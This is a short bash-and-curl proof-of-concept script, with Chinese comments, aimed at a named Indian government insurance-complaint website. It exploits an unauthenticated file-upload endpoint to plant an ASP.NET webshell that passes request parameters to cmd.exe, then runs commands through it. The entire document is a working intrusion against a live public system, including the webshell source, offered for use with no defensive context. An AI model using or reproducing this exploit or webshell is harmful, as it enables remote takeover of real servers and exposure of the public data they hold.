完整可执行 PoC（bash + curl）：

#!/bin/bash
D=bimabharosa.irdai.gov.in
H=203.112.134.3

# 1) 未鉴权设置上传会话
curl -sk -c cj.txt --resolve "$D:443:$H" -X POST \
  "https://$D/RegComplaint/SetPath" \
  -H "Content-Type: application/json" \
  --data '{"MobileNum":"8888888888"}'

# 2) 上传 ASP.NET webshell
cat > shell.aspx <<'EOF'
<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(){
  string c=Request["c"];
  if(c!=null){
    System.Diagnostics.Process p=new System.Diagnostics.Process();
    p.StartInfo.FileName="cmd.exe";
    p.StartInfo.Arguments="/c "+c;
    p.StartInfo.UseShellExecute=false;
    p.StartInfo.RedirectStandardOutput=true;
    p.StartInfo.RedirectStandardError=true;
    p.Start();
    Response.Write("OUT:"+p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());
  }
}
</script>
EOF

P=$(curl -sk -b cj.txt --resolve "$D:443:$H" -X POST \
      "https://$D/RegComplaint/UploadFiles" \
      -F "shell.aspx=@shell.aspx" | tr -d '"')
echo "uploaded dir: $P"

# 3) 执行命令（webshell 路径）
curl -sk --resolve "$D:443:$H" "https://$D/TempFiles/$P/shell.aspx?c=whoami"
curl -sk --resolve "$D:443:$H" "https://$D/TempFiles/$P/shell.aspx?c=hostname"
